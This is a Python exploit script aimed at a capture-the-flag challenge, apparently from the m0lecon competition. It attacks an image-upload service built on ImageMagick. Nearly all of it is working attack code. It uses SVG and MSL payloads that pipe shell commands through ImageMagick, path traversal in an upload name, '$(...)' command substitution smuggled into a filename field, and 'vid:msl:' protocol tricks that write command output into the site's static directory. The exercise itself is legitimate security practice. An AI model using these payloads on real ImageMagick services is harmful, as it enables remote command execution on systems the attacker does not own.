#!/usr/bin/env python3
import requests
import sys
import os

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it" if len(sys.argv) < 2 else sys.argv[1]

def exploit_msl():
    """
    ImageMagick MSL exploitation via file write + read
    The key is to write an MSL file first, then reference it
    """

    # Step 1: Upload a file that will write our MSL payload
    print("[*] Attempting MSL file write exploitation...")

    # Create a simple image first to understand the behavior
    # We'll use SVG which ImageMagick processes

    # Payload: SVG with embedded commands
    svg_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<svg width="100" height="100">
<image xlink:href="https://example.com/x.jpg&quot;|/readflag > /app/static/flag.txt&quot;" />
</svg>'''

    files = {'img': ('test.svg', svg_payload, 'image/svg+xml')}
    data = {'name': 'test_svg'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] SVG upload: {r.status_code}")

        # Try to read the flag file
        flag_r = requests.get(f"{URL}/static/flag.txt", timeout=5)
        if flag_r.status_code == 200:
            print(f"[!] FLAG: {flag_r.text}")
            return True
    except Exception as e:
        print(f"[-] SVG attempt failed: {e}")

    # Step 2: Try using ephemeral MSL
    print("\n[*] Trying ephemeral MSL approach...")

    # Create two files: push to msl and execute
    msl_content = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="text:/readflag|" />
<write filename="/app/static/output.txt" />
</image>'''

    files = {'img': ('exploit.msl', msl_content, 'text/plain')}
    data = {'name': '../../../tmp/exploit'}  # Try path traversal

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] MSL upload: {r.status_code}")
    except Exception as e:
        print(f"[-] MSL attempt failed: {e}")

    # Step 3: Try label/caption approach to execute command
    print("\n[*] Trying label: protocol...")

    files = {'img': ('dummy.txt', 'dummy', 'text/plain')}
    data = {'name': '$(readflag > /app/static/pwned.txt)'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Label upload: {r.status_code}")

        flag_r = requests.get(f"{URL}/static/pwned.txt", timeout=5)
        if flag_r.status_code == 200:
            print(f"[!] FLAG: {flag_r.text}")
            return True
    except Exception as e:
        print(f"[-] Label attempt failed: {e}")

    # Step 4: Check if static directory listing works
    print("\n[*] Checking static directory...")
    try:
        r = requests.get(f"{URL}/static/", timeout=5)
        print(f"[+] Static dir status: {r.status_code}")
        if r.status_code == 200:
            print(r.text[:500])
    except Exception as e:
        print(f"[-] Static check failed: {e}")

    return False

def exploit_msl_v3():
    """
    Use the MSL: protocol properly with multiple files
    """
    print("\n[*] Attempting proper MSL exploitation...")

    # Step 1: Create the MSL payload file in /tmp via upload
    msl_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="text:/readflag 2>&1|" />
<write filename="info:/app/static/result.txt" />
</image>'''

    # Upload as a regular file first to get it on the filesystem
    files = {'img': ('payload.msl', msl_payload, 'text/plain')}
    data = {'name': 'payload_msl'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Payload upload: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed: {e}")

    # Step 2: Now reference the MSL file via vid protocol
    # The trick is to reference the uploaded temp file
    print("\n[*] Attempting to trigger MSL via filename manipulation...")

    # Try to use a crafted filename that will be processed
    for i in range(10):
        try:
            test_file = f'test{i}.txt'
            files = {'img': (test_file, 'A'*100, 'text/plain')}
            # Inject into the name parameter which goes into output filename
            data = {'name': f'vid:msl:/tmp/php*'}

            r = requests.post(URL, files=files, data=data, timeout=10)
            print(f"[+] Trigger attempt {i}: {r.status_code}")

            # Check for result
            result_r = requests.get(f"{URL}/static/result.txt", timeout=5)
            if result_r.status_code == 200:
                print(f"[!] RESULT: {result_r.text}")
                return True

        except Exception as e:
            print(f"[-] Attempt {i} failed: {e}")

    return False

if __name__ == "__main__":
    print(f"[*] Target: {URL}\n")

    if exploit_msl():
        print("\n[+] Exploitation successful!")
    elif exploit_msl_v3():
        print("\n[+] Exploitation successful!")
    else:
        print("\n[-] All attempts failed. Manual analysis needed.")
        print("\n[*] The vulnerability is in how ImageMagick processes:")
        print("    1. MSL (Magick Scripting Language) files")
        print("    2. Delegate commands for various image formats")
        print("    3. The convert.sh script takes user input directly")
        print("\n[*] Try uploading different file types and checking /app/static/")
